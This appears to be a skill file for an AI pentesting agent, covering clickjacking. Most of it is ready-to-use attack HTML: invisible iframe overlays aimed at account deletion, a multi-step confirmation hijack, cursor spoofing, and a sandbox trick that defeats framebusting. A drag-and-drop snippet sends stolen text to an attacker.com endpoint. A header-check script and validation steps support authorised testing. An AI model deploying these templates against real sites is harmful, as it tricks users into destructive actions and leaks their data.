---
name: clickjacking
description: Clickjacking - frame overlay attacks, multi-step, drag-and-drop, X-Frame-Options bypass, CSP frame-ancestors testing
---

# Clickjacking

Clickjacking tricks users into clicking elements on a hidden page by overlaying a transparent iframe containing the target site over a decoy page. The victim thinks they are clicking the decoy's elements but are actually interacting with the victim application.

## Attack Surface

**Vulnerable Features**
- One-click account deletion or sensitive CSRF-like operations
- Social media Share/Like/Follow buttons (classic likejacking)
- OAuth "Authorize Application" consent pages
- Two-factor auth disable/enrollment pages
- "Confirm Purchase" / "Send Transfer" buttons
- Permission grant dialogs (camera, microphone, notifications)
- Password change forms (if no re-auth required)
- Profile picture change (used for social engineering)

**Defense Headers (check for absence)**
- `X-Frame-Options: DENY` or `SAMEORIGIN`
- `Content-Security-Policy: frame-ancestors 'none'` or `'self'`

## Basic Frame Overlay Template

```html
<!DOCTYPE html>
<html>
<head>
  <style>
    #decoy {
      position: absolute;
      top: 450px;    /* adjust to align decoy button */
      left: 250px;
      z-index: 2;
      font-size: 1.2em;
    }
    #victim-iframe {
      position: relative;
      width: 900px;
      height: 700px;
      opacity: 0.0001;    /* invisible to user */
      z-index: 1;
    }
  </style>
</head>
<body>
  <div id="decoy">Click here to claim your prize!</div>
  <iframe id="victim-iframe"
    src="https://victim.com/account/delete"
    sandbox="allow-forms allow-scripts allow-same-origin">
  </iframe>
</body>
</html>
```

Calibration: increase opacity to `0.5` while positioning to align buttons, then set back to `0.0001`.

## Multi-Step Clickjacking

For operations requiring multiple confirmations:

```html
<!DOCTYPE html>
<html>
<head>
  <script>
    var step = 1;
    function nextStep() {
      if (step === 1) {
        document.getElementById('decoy').innerText = 'Click to Continue';
        document.getElementById('victim-iframe').src = 'https://victim.com/account/delete/confirm';
        step = 2;
      }
    }
  </script>
  <style>
    #decoy { position: absolute; top: 480px; left: 280px; z-index: 2; cursor: pointer; }
    #victim-iframe { position: relative; width: 900px; height: 700px; opacity: 0.0001; z-index: 1; }
  </style>
</head>
<body>
  <div id="decoy" onclick="nextStep()">Click to proceed to the next step</div>
  <iframe id="victim-iframe" src="https://victim.com/account/delete"></iframe>
</body>
</html>
```

## Drag-and-Drop Exfiltration

Used when JavaScript drag-and-drop enables clipboard or text theft:

```html
<style>
  #decoy-drag-area {
    width: 200px; height: 50px; border: 2px dashed #ccc;
    position: absolute; top: 300px; left: 100px; z-index: 2;
  }
  iframe { position: absolute; top: 0; left: 0; opacity: 0.0001; z-index: 1; }
</style>
<div id="decoy-drag-area" ondrop="steal(event)" ondragover="event.preventDefault()">
  Drop your coupon code here!
</div>
<iframe src="https://victim.com/sensitive-data"></iframe>
<script>
function steal(e) {
  var txt = e.dataTransfer.getData('text');
  new Image().src = 'https://attacker.com/steal?d=' + encodeURIComponent(txt);
}
</script>
```

## Cursor Hijacking

Trick user into clicking while thinking cursor is elsewhere:

```css
body { cursor: none; }
#fake-cursor {
  position: fixed; width: 12px; height: 12px;
  background: url('cursor.png') no-repeat;
  pointer-events: none; z-index: 99999;
  /* offset 200px right so real invisible click lands elsewhere */
  transform: translate(-200px, 0);
}
```

## Sandbox Attribute Bypass

Some defenses use framebusting JavaScript. Counter with sandbox:

```html
<!-- Disable framebusting JS while allowing form submission -->
<iframe sandbox="allow-forms allow-scripts allow-same-origin"
        src="https://victim.com/delete"></iframe>

<!-- allow-scripts needed for JS interactions -->
<!-- allow-same-origin needed for cookie access in some flows -->
<!-- Do NOT include allow-top-navigation which would let iframe break out -->
```

## Detection (Testing Target Frameability)

```python
import requests

def check_framing(url):
    r = requests.get(url, verify=False, timeout=10)
    xfo = r.headers.get("X-Frame-Options", "").upper()
    csp = r.headers.get("Content-Security-Policy", "")
    
    # Extract frame-ancestors from CSP
    fa = ""
    for directive in csp.split(";"):
        if "frame-ancestors" in directive.lower():
            fa = directive.strip()
            break
    
    if not xfo and not fa:
        print(f"[VULNERABLE] No framing protection: {url}")
    elif xfo in ("DENY", "SAMEORIGIN"):
        print(f"[PROTECTED] X-Frame-Options: {xfo}")
    elif fa:
        print(f"[PROTECTED] CSP frame-ancestors: {fa}")
    else:
        print(f"[CHECK] Partial protection: XFO={xfo}, FA={fa}")

check_framing("https://example.com/account/settings")
```

## X-Frame-Options Bypass

XFO is not supported in all CSP-aware browsers consistently. CSP `frame-ancestors` overrides XFO per spec. Test:

```
# Check if browser actually enforces XFO
# IE/compatibility modes may ignore ALLOW-FROM variant
# Chromium respects CSP > XFO
X-Frame-Options: ALLOW-FROM https://trusted.com  # deprecated, ignored by Chrome/Firefox
```

## Validation Approach

1. Check response headers for XFO and CSP frame-ancestors on target sensitive page
2. If absent/misconfigured, build overlay PoC with `opacity: 0.0001`
3. Screenshot showing iframe is rendering (opacity 0.5 test)
4. Demonstrate button alignment with victim's action button
5. Record: response headers (no XFO) → PoC HTML → proof of framing

## Tools

- Browser DevTools — iframe alignment calibration
- Clickjacking tester (Burp extension)
- `curl -I` — quick header check
- Manual PoC HTML above
